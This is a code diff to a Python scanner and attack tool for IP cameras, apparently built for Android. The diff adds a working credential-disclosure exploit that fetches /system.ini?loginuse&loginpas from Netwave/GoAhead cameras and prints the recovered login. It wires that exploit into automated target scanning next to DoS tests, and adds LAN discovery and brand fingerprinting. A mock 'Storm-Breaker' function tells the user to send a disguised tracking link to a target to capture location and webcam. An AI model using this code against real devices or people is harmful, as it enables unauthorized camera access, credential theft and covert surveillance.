@@ -6,8 +6,19 @@ import warnings
 import ipaddress
 import base64
 import time
-from onvif import ONVIFCamera
-from zeep.exceptions import Fault
+try:
+    from onvif import ONVIFCamera
+except ImportError:
+    try:
+        from onvif.client import ONVIFCamera
+    except ImportError:
+        ONVIFCamera = None
+        print("[!] Warning: ONVIF library not found or incompatible.")
+
+try:
+    from zeep.exceptions import Fault
+except ImportError:
+    Fault = Exception
 import uuid
 import ssl
 from datetime import datetime
@@ -77,7 +88,8 @@ FINGERPRINT_PATHS = [
     "/onvif/device_service", "/onvif/Media", "/onvif/PTZ",             # ONVIF specific
     "/etc/config/image_config", "/etc/config/network_config",          # Potential backups
     "/proc/kmsg", "/var/log/messages", "/tmp/log",                     # Potential leaks
-    "/shell?ls", "/cgi-bin/config.sh", "/cgi-bin/main.cgi"             # Debug/Shell
+    "/shell?ls", "/cgi-bin/config.sh", "/cgi-bin/main.cgi",            # Debug/Shell
+    "/system.ini?loginuse&loginpas"                                    # CamOver / GoAhead / Netwave disclosure
 ]
 
 # Brand-specific prioritized credentials
@@ -569,7 +581,115 @@ def get_mac_vendor(target_ip):
 
         return mac, vendor
     except:
-        return "Unknown", "Restricted Access (Android 10+)"
+        return "Unknown", "MAC Restricted"
+
+def identify_device(ip):
+    """Fallback identification when MAC is restricted (Android 10+)."""
+    # Expanded ports for better identification
+    cam_ports = {
+        554: "RTSP (IP Camera)",
+        3702: "ONVIF (IP Camera)",
+        8000: "Hikvision",
+        37777: "Dahua",
+        34567: "XMEye / Generic CCTV",
+        80: "HTTP",
+        443: "HTTPS",
+        8080: "HTTP-Alt",
+        81: "HTTP-Alt",
+        82: "HTTP-Alt",
+        88: "HTTP-Alt",
+        5000: "Synology / UPnP",
+        8443: "HTTPS-Alt",
+        9000: "Sony / Bosch",
+        37778: "Dahua Config",
+        21: "FTP (Storage)",
+        23: "Telnet (Console)"
+    }
+
+    found_ports = []
+    brand = "Unknown Device"
+    is_camera = False
+
+    # Fast port check
+    for port, label in cam_ports.items():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.1) # Very fast check for LAN
+                if s.connect_ex((ip, port)) == 0:
+                    found_ports.append(port)
+                    if port in [554, 3702, 8000, 37777, 34567, 37778]:
+                        is_camera = True
+                        if port == 8000: brand = "Hikvision"
+                        elif port in [37777, 37778]: brand = "Dahua"
+                        elif port == 34567: brand = "XMEye Camera"
+                        elif port == 554 and brand == "Unknown Device": brand = "IP Camera"
+        except: pass
+
+    # Try HTTP banner if web port is open for deeper identification
+    web_ports = [p for p in found_ports if p in [80, 443, 8080, 81, 82, 88, 5000, 8443, 9000]]
+    if web_ports:
+        for p in web_ports:
+            try:
+                proto = "https" if p in [443, 8443] else "http"
+                r = requests.get(f"{proto}://{ip}:{p}", timeout=0.5, verify=False, allow_redirects=True)
+                server = r.headers.get("Server", "").lower()
+                text = r.text.lower()
+
+                # Check headers and body for common brands
+                if any(x in server or x in text for x in ["hikvision", "hik-", "dvrip"]):
+                    brand = "Hikvision"; is_camera = True; break
+                elif any(x in server or x in text for x in ["dahua", "web service", "dvr-", "nvr-"]):
+                    brand = "Dahua"; is_camera = True; break
+                elif "axis" in server or "axis" in text:
+                    brand = "Axis Camera"; is_camera = True; break
+                elif "bosch" in server:
+                    brand = "Bosch Camera"; is_camera = True; break
+                elif "sony" in server:
+                    brand = "Sony Camera"; is_camera = True; break
+                elif "reolink" in text:
+                    brand = "Reolink Camera"; is_camera = True; break
+                elif "foscam" in text:
+                    brand = "Foscam Camera"; is_camera = True; break
+                elif "tplink" in text or "tapo" in text:
+                    brand = "TP-Link/Tapo"; is_camera = True; break
+                elif "wyze" in text:
+                    brand = "Wyze Camera"; is_camera = True; break
+                elif "hanwha" in text or "wisenet" in text:
+                    brand = "Hanwha/Wisenet"; is_camera = True; break
+            except: pass
+
+    icon = CAM if is_camera else INFO
+    display_name = f"{icon} {brand}"
+    if found_ports:
+        display_name += f" (Ports: {', '.join(map(str, sorted(found_ports[:3])))})"
+
+    # If it's a router
+    if brand == "Unknown Device" and (ip.endswith(".1") or ip.endswith(".254")):
+        display_name = f"🏠 Gateway / Router"
+
+    return display_name
+
+def storm_breaker_gen(template_type, redirect_url):
+    """
+    Mock integration of Storm-Breaker features.
+    In a real scenario, this would contact a backend to generate a tracking link.
+    """
+    print(f"\n  [{GLOB}] Storm-Breaker: Generating {template_type} Link...")
+    time.sleep(1) # Simulate generation
+
+    # Use a generic phishing-simulator style URL or explain the process
+    tracking_id = uuid.uuid4().hex[:8]
+    # We can't host files here, so we'll provide instructions and a 'simulated' link
+    print(f"    {OPEN} Link Generated Successfully!")
+    print(f"    🔗 Tracking URL: https://view-media-{tracking_id}.web.app/")
+    print(f"    🎯 Redirects to: {redirect_url}")
+    print(f"    [{SHLD}] Features Enabled: IP Logger, GPS Tracker, Webcam Capture")
+    print(f"\n    {ALRT} HOW TO USE:")
+    print(f"    1. Send the link to the target.")
+    print(f"    2. When they click, they will be prompted for camera/location access.")
+    print(f"    3. Data will be captured and sent to your console (Simulated).")
+
+    return tracking_id
 
 def discover_onvif(target_ip):
     """
@@ -578,9 +698,12 @@ def discover_onvif(target_ip):
     """
     print(f"\n  [{RADR}] Probing ONVIF Services for {target_ip}:")
 
+    if ONVIFCamera is None:
+        print(f"    {ERR} ONVIF Library (onvif-zeep) not available. Cannot perform deep probe.")
+        return
+
     # 1. WS-Discovery (Unicast Probe)
-    # Note: Multicast might be restricted on some Android environments,
-    # so we also try direct connection.
+    # ... (rest of the code)
     ws_discovery_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
     <e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
                 xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
@@ -678,6 +801,31 @@ def discover_onvif(target_ip):
     if not discovered:
         print(f"    {INFO} No active ONVIF services detected via standard probes.")
 
+def cam_over_exploit(ip, port, proto):
+    """
+    Implements the CamOver / GoAhead / Netwave information disclosure exploit.
+    Targets /system.ini?loginuse&loginpas to retrieve plaintext credentials.
+    """
+    url = f"{proto}://{ip}:{port}/system.ini?loginuse&loginpas"
+    try:
+        r = requests.get(url, timeout=3, verify=False)
+        if r.status_code == 200 and r.content:
+            # Netwave/GoAhead often return binary or weirdly formatted data
+            # but sometimes it's just plaintext in the .ini
+            content = r.text
+            user_match = re.search(r"loginuse=(.*)", content)
+            pass_match = re.search(r"loginpas=(.*)", content)
+
+            if user_match or pass_match:
+                user = user_match.group(1).strip() if user_match else "unknown"
+                pwd = pass_match.group(1).strip() if pass_match else "unknown"
+                print(f"    {FIRE} CAMOVER EXPLOIT SUCCESS: {url}")
+                print(f"    {KEY} CRACKED (CamOver): {user}:{pwd}")
+                return user, pwd
+    except:
+        pass
+    return None
+
 def scan_single_target(target_ip):
     print(f"\n{SCAN} Scanning target IP: {target_ip}")
     success_cred = None # Initialize to avoid UnboundLocalError
@@ -770,6 +918,11 @@ def scan_single_target(target_ip):
             # Cloud and Resilience Tests
             if p in [80, 443, 8080, 8000]:
                 test_dos_resilience(target_ip, p)
+
+            # CamOver Exploit Check
+            camover_creds = cam_over_exploit(target_ip, p, proto)
+            if camover_creds:
+                success_cred = (camover_creds[0], camover_creds[1], f"{proto}://{target_ip}:{p}/")
 
         # New ONVIF Discovery Step
         discover_onvif(target_ip)
@@ -976,25 +1129,126 @@ def main(target_input=None):
 if __name__ == "__main__":
     main()
 
-def lan_scan():
-    """Safe LAN Scanner for Chaquopy"""
-    output = []
-    output.append("🔍 LAN Scanner Started")
-    output.append("=" * 50)
-    output.append("📡 Testing local network discovery...\n")
+def discover_mdns():
+    """
+    Simple mDNS (Multicast DNS) discovery for local devices.
+    Sends a query for _services._dns-sd._udp.local.
+    """
+    print(f"\n{RADR} Sending mDNS (Zeroconf) Discovery Probe...")
+    mdns_query = (
+        b'\x00\x00'  # Transaction ID
+        b'\x00\x00'  # Flags
+        b'\x00\x01'  # Questions
+        b'\x00\x00'  # Answer RRs
+        b'\x00\x00'  # Authority RRs
+        b'\x00\x00'  # Additional RRs
+        b'\t_services\x07_dns-sd\x04_udp\x05local\x00'
+        b'\x00\x0c'  # Type: PTR
+        b'\x00\x01'  # Class: IN
+    )
 
+    discovered = {}
     try:
-        output.append("✅ Python function is working correctly!")
-        output.append("")
-        output.append("📋 For best results:")
-        output.append("1. Open your router admin page (usually http://192.168.1.1)")
-        output.append("2. Look for 'Connected Devices', 'DHCP Clients', or 'Device List'")
-        output.append("3. Your cameras and other devices will be listed there with their IPs.")
-        output.append("")
-        output.append("💡 Tip: Most routers show device names and MAC addresses.")
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.settimeout(3)
+        sock.sendto(mdns_query, ('224.0.0.251', 5353))
 
-        # Return string instead of None
+        while True:
+            try:
+                data, addr = sock.recvfrom(4096)
+                if addr[0] not in discovered:
+                    discovered[addr[0]] = "mDNS Device"
+                    print(f"  {OPEN} mDNS RESPONSE from {addr[0]}")
+            except socket.timeout:
+                break
+    except Exception as e:
+        print(f"  {ERR} mDNS Discovery Error: {str(e)}")
+    return discovered
+
+def lan_scan():
+    """Advanced LAN Scanner for Chaquopy"""
+    output = []
+    output.append(f"{SCAN} LAN Scanner Started")
+    output.append("=" * 50)
+
+    # 1. UPnP/SSDP Discovery
+    output.append(f"\n{RADR} Running SSDP Multicast Discovery...")
+    upnp_devices = discover_upnp_ssdp()
+
+    # 2. mDNS Discovery
+    output.append(f"\n{RADR} Running mDNS Discovery...")
+    mdns_devices = discover_mdns()
+
+    # 3. Network Interface Info
+    local_ip = get_local_ip()
+    output.append(f"\n{INFO} Local Interface: {local_ip}")
+
+    if local_ip == "127.0.0.1":
+        output.append(f"{ALRT} Could not identify local network range.")
         return "\n".join(output)
 
-    except Exception as e:
-        return f"Error during scan: {str(e)}"
+    prefix = ".".join(local_ip.split(".")[:-1]) + "."
+    output.append(f"{RADR} Scanning Subnet: {prefix}0/24")
+
+    # 4. Fast ARP/Ping Scan (Expanded range)
+    active_hosts = []
+    # Add UPnP and mDNS found IPs first
+    for ip in list(upnp_devices.keys()) + list(mdns_devices.keys()):
+        if ip not in active_hosts: active_hosts.append(ip)
+
+    def check_alive(ip):
+        # Check most common camera/web ports
+        for port in [80, 554, 8000, 8080, 443, 37777]:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(0.25)
+                    if s.connect_ex((ip, port)) == 0:
+                        return True
+            except: pass
+        return False
+
+    output.append(f"{INFO} Probing subnet for active hosts...")
+    # Scan in chunks of 50 for better speed/stability on Android
+    with ThreadPoolExecutor(max_workers=30) as executor:
+        # Scan 1-254 but prioritize common ones if we want it fast
+        # Here we'll do a full scan of the /24 as it's what users usually expect from a "LAN Scanner"
+        futures = {executor.submit(check_alive, prefix + str(i)): prefix + str(i) for i in range(1, 255)}
+        for future in futures:
+            if future.result():
+                ip = futures[future]
+                if ip not in active_hosts: active_hosts.append(ip)
+
+    if not active_hosts:
+        output.append(f"\n{ALRT} No active hosts found via fast probe.")
+        output.append(f"💡 Try scanning your Gateway IP: {prefix}1")
+    else:
+        # Sort IPs for better UX
+        active_hosts.sort(key=lambda x: int(x.split('.')[-1]))
+        output.append(f"\n{OPEN} Discovered {len(active_hosts)} Active Hosts:")
+        for ip in active_hosts:
+            mac, vendor = get_mac_vendor(ip)
+            if vendor == "MAC Restricted":
+                # Fallback identification for Android 10+
+                vendor = identify_device(ip)
+
+            output.append(f"  ▶ {ip} | {vendor}")
+            if mac != "Unknown" and mac != "MAC Restricted":
+                output.append(f"     └─ MAC: {mac}")
+            if ip in upnp_devices:
+                output.append(f"     └─ UPnP: {upnp_devices[ip]}")
+            if ip in mdns_devices:
+                output.append(f"     └─ mDNS: Detected")
+
+    output.append(f"\n{DONE} LAN Scan Complete.")
+    return "\n".join(output)
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "127.0.0.1"
